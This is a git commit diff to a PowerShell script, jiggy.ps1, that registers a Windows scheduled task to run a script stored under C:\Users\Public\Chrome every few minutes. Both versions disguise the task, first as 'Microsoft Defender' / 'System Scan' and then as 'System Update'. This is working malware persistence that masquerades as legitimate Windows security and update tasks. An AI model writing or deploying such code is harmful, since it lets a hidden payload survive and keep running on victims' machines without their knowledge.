44f9c7a58af9523bc7e448a8cd5d1cb79c771ae0
Mxfire0324 <162410399+Mxfire0324@users.noreply.github.com>
2024-03-06 17:30:47 +0530

    Update jiggy.ps1

--- jiggy.ps1
+++ jiggy.ps1
@@ -1,7 +1,4 @@
-# Define the path to your PowerShell script
-$scriptPath = "C:\Users\Public\Chrome\chrome.ps1"
+$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument 'C:\Users\Public\Chrome\chrome.ps1'
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
 
-# Create a new scheduled task
-$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
-$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10)
-Register-ScheduledTask -TaskName "Microsoft Defender" -Action $action -Trigger $trigger -Description "System Scan." -ErrorAction Stop
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'System Update' -Description 'System Updates'
